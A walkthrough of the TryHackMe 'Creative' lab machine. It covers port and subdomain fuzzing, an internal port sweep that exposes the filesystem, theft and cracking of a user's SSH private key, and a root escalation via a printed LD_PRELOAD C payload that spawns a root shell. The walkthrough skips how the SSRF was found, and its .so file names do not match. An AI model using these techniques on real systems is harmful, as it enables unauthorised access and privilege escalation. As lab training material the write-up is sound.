---
parent: "[[CTFs - THM]]"
resources:
---

```bash
# PLATFORM          . THM
# CTF NAME          . Creative
# DESCRIPTION       . Exploit a vulnerable web application and some misconfigurations to gain root privileges.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/r/room/creative
```

```bash
sudo nmap -sSVC 10.10.51.79 -T5 -p-
```

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a05c1c4eb486cf589f22f97c543d7e7b (RSA)
|   256 47d5bb58b6c5cce36c0b00bd95d2a0fb (ECDSA)
|_  256 cb7cad3141bb98afcfebe4887f125e89 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- I added the `creative.thm` entry in `/etc/hosts` file.

```
10.10.51.79    creative.thm
```

- I then went to access the website and took a look at the source code. 
- Some hrefs were pointing to `assets` and `vendors` but I didn't have access to those endpoints.

- I decided against fuzzing for endpoints to see if there are any other.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://creative.thm/FUZZ
```

- I did the same for `/assets` directory, but with no luck.

- Then I've decided to FUZZ for subdomains.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.creative.thm" -u http://creative.thm -fc 301
```

```
{redacted}         [Status: 200, Size: 591, Words: 91, Lines: 20]
```

- After wasting quite some time here, I decided that since I cannot make it get files from my device, I should start focusing on the server itself.

- Accessing `http://localhost:80` worked (as expected), but other ports showed as `dead`. 

- However, there are 65536 ports, so let's start fuzzing :) 

- I did this in burp using the Intruder tab and setting the payload to `numbers` from 1-65535.
- However, this method is VERY slow, but I had to leave home for couple of hours and I hoped it'll find something before the room timer would expire.

- All response page length was 184 bytes, but one of them had 1316 bytes in length.
- By navigating to that port, I found the entire filesystem exposed to the webserver.

- We can access files by navigating to `http://localhost:PORT/path/to/file`.

- You can already get the `user.txt` flag by accessing `http://localhost:PORT/home/saad/user.txt`

- Another thing I did was to go from directory to directory to enumerate for a while and I found `saad`'s private SSH key in `/home/saad/.ssh/id_rsa`.

```
ssh -i id_rsa saad@10.10.51.79
Enter passphrase for key 'id_rsa':
```

- To crack this, I've used `john`.

```
python3 /opt/john/run/ssh2john.py id_rsa > john
```

```
/opt/john/run/john john --wordlist=/usr/share/wordlists/rockyou.txt
```

- After finding out the passphase, I SSHed to the box using

```
ssh -i id_rsa saad@creative.thm
```

- I was able to find the password for `saad` in `.bash_history` file.

```
echo "saad:MyStr{REDACTED}et$4291" > creds.txt
```

- Having that, I could run `sudo -l`

```
User saad may run the following commands on m4lware:
    (root) /usr/bin/ping
```

- This wouldn't be of much help by itself, but look what else is used on the system

```
env_keep+=LD_PRELOAD
```

- **LD_PRELOAD** is an environment variable that lists shared libraries with functions that override the standard set. 

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
	void _init() {
		unsetenv("LD_PRELOAD");
		setgid(0);
		setuid(0);
		system("/bin/sh");
	}
```

- Complile this on the VICTIM machine using

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

- Then, execute any **sudo** command specifying the malicious **LD_PRELOAD** file first.

```
sudo LD_PRELOAD=/tmp/test.so /usr/bin/ping
```

```
sudo LD_PRELOAD=/home/saad/secret.so /usr/bin/ping
# whoami
root
```

